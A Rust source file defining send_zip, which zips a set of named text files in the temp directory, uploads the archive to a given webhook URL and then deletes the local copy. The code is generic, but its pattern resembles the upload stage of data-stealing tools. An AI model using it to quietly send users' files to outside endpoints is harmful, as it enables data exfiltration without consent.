use std::{env, fs, io::Write};
use zip::write::FileOptions;
use crate::dbg_log;

#[allow(dead_code)]
pub async fn send_zip(
    client: &reqwest::Client,
    webhook_url: &str,
    files: &[(String, String)],
    zip_filename: &str,
) -> Result<(), Box<dyn std::error::Error>> {
    dbg_log!("snd::send_zip called with {} files, zip={}", files.len(), zip_filename);
    if files.is_empty() {
        dbg_log!("snd::send_zip early return - no files");
        return Ok(());
    }

    let zip_path = env::temp_dir().join(zip_filename);
    dbg_log!("snd::send_zip zip_path={:?}", zip_path);

    {
        dbg_log!("snd::send_zip creating zip...");
        let file = fs::File::create(&zip_path)?;
        let mut zip = zip::ZipWriter::new(file);
        let options = FileOptions::default()
            .compression_method(zip::CompressionMethod::Deflated);

        for (name, content) in files {
            dbg_log!("snd::send_zip adding file: {} ({} bytes)", name, content.len());
            zip.start_file(name, options)?;
            zip.write_all(content.as_bytes())?;
        }

        zip.finish()?;
        dbg_log!("snd::send_zip zip created OK");
    }

    let zip_data = fs::read(&zip_path)?;
    dbg_log!("snd::send_zip read {} bytes from zip", zip_data.len());

    let part = reqwest::multipart::Part::bytes(zip_data)
        .file_name(zip_filename.to_string())
        .mime_str("application/zip")?;

    let form = reqwest::multipart::Form::new().part("file", part);

    dbg_log!("snd::send_zip sending to webhook...");
    let response = client.post(webhook_url).multipart(form).send().await?;
    let status = response.status();
    let body = response.text().await.unwrap_or_default();
    dbg_log!("snd::send_zip response status={} body_len={}", status.as_u16(), body.len());
    if !status.is_success() {
        return Err(format!("webhook failed: {} {}", status, body).into());
    }

    let _ = fs::remove_file(&zip_path);
    dbg_log!("snd::send_zip done OK");

    Ok(())
}
